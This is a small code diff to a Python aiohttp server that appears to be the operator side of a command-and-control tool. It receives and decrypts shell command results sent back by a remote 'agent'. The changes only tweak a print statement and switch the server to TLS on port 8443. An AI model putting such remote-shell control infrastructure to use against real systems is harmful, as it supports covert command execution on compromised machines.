@@ -115,7 +115,7 @@ async def PostResultsShell(request):
     ShellResults = await request.text()
     if  getname!=AgentNameClass.CurrentAgentName:
         return web.Response(status=200)
-    print("\n[+] Shell Command Results:\n")
+    print("\n[+] Shell Command Results:")
     print("\n" + str(Ecrypto().decrypt(ShellResults)) + "\n")
     SentCommand.SendCmd = ""
     return web.Response(status=200)
@@ -130,5 +130,5 @@ if __name__ == '__main__':
     ssl_context.load_cert_chain('domain_srv.crt', 'domain_srv.key')
     webApp = Thread(target=Console().cmdloop)
     webApp.start()
-    #web.run_app(app, ssl_context=ssl_context)
-    web.run_app(app)
+    web.run_app(app, ssl_context=ssl_context,port=8443)
+    #web.run_app(app,port=8443)
